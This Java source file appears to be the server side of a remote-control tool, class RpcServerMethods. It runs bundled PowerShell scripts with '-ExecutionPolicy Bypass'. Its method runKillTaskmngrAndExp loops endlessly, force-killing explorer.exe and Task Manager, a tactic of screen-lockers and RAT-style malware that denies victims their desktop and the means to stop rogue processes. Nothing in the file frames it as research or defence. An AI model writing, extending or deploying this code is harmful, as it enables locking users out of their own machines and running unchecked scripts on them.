package main.server;

import java.io.*;

public class RpcServerMethods {

    // Helper method to run a PowerShell script
    private void runScript(String psScriptPath) {
        try {
            ProcessBuilder pb = new ProcessBuilder( //Makes new ProcessBuilder to start Powershell
                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", psScriptPath);

            pb.redirectErrorStream(true); //Redirects all errors from Powershell
            Process process = pb.start(); //Starts the process

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            //Waits until the script is finished.
            int exitCode = process.waitFor();
            System.out.println("PowerShell script exited with code: " + exitCode);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void runScriptFromResources(String resourceName) {
        try {
            // Load the script from resources (classpath)
            InputStream in = getClass().getClassLoader().getResourceAsStream(resourceName);
            if (in == null) {
                throw new FileNotFoundException("Resource not found: " + resourceName);
            }
            // Write the script to a temp file
            File tempFile = File.createTempFile("script", ".ps1");
            tempFile.deleteOnExit();
            try (FileOutputStream out = new FileOutputStream(tempFile)) {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = in.read(buffer)) > 0) {
                    out.write(buffer, 0, len);
                }
            }
            in.close();
            // Run the temp file with PowerShell
            ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", tempFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            int exitCode = process.waitFor();
            System.out.println("PowerShell script exited with code: " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void runKillTaskmngrAndExp() {
        while(true) {
            try {
                // Kill explorer.exe
                Process explorer = Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
                explorer.waitFor();

                // Kill Taskmgr.exe
                Process taskmgr = Runtime.getRuntime().exec("taskkill /F /IM Taskmgr.exe");
                taskmgr.waitFor();

                System.out.println("explorer.exe and Taskmgr.exe killed!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
